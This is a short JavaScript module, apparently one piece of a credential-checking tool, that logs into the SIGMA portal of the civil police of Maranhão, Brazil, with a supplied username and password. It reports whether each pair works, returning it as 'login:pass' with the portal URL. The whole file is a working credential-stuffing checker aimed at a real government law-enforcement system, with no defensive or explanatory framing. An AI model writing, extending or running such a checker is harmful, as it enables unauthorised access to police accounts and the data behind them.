import axios from 'axios'
import request from '../core/configs.js'

export default async function sigmaMa(login,pass) {

    const url = 'https://sigma.policiacivil.ma.gov.br/';

    const getCokie = await axios({
        url:url,
        method:'GET'
    })

    let headers = request.headers;
    headers.cookie = getCokie.headers['set-cookie'];
    
    const dataRequest = `username=${login}&password=${pass}`;
    
    await axios({
        url : url,
        method: 'POST', 
        headers: request.headers,
        data: dataRequest,
    })
    
    const {data} = await axios({
        url:url,
        method:'GET',
        headers:request.headers
    })

    if (data.includes('Usuário ou senha incorretos')) return {
        success:false,
        login : login+":"+pass,
        uri : url
    }
    return {
        success:true,
        login : login+":"+pass,
        uri : url
    }
}


